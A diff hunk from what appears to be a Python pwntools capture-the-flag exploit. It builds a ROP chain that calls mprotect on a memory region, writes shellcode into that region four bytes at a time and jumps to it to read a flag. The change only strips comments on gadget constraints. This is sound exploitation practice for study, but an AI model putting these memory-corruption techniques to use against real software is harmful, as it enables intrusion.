@@ -59,15 +59,15 @@ shellcode = asm('''
 ''')  # shellcode to trigger open&read&write to retrieve flag
 payload = b''
 # trigger mprotect(0x500000, 0x1000, 7) to make 0x500000-0x501000 region writable
-payload += p64(GADGET_1)+p64(0)+p64(1)+p64(MPROTECT_GOT)+p64(0x500000)+p64(0x1000)+p64(0x7)+p64(GADGET_2)+p64(0)  # ensure "add rbx, 0x1; cmp rbp, rbx; add rsp, 0x8;" in GADGET_2
+payload += p64(GADGET_1)+p64(0)+p64(1)+p64(MPROTECT_GOT)+p64(0x500000)+p64(0x1000)+p64(0x7)+p64(GADGET_2)+p64(0)
 # write shellcode to writable region starting from 0x500007 four bytes at a time
 position = 0
 while position < len(shellcode):
     four_bytes = shellcode[position:position + 4]
     if position != 0:
-        payload += p64(GADGET_1)+four_bytes.ljust(8, b'\x00')+p64(0x500007+position+0x3d)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(GADGET_3)  # ensure "add dword ptr [rbp - 0x3d], ebx;" in GADGET_3
+        payload += p64(GADGET_1)+four_bytes.ljust(8, b'\x00')+p64(0x500007+position+0x3d)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(GADGET_3)
     else:
-        payload += four_bytes.ljust(8, b'\x00')+p64(0x500007+position+0x3d)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(GADGET_3)  # ensure "add dword ptr [rbp - 0x3d], ebx;" in GADGET_3
+        payload += four_bytes.ljust(8, b'\x00')+p64(0x500007+position+0x3d)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(GADGET_3)
     position += 4
 # jump to starting address 0x500007 to execute shellcode just written
 payload += p64(0x500007)
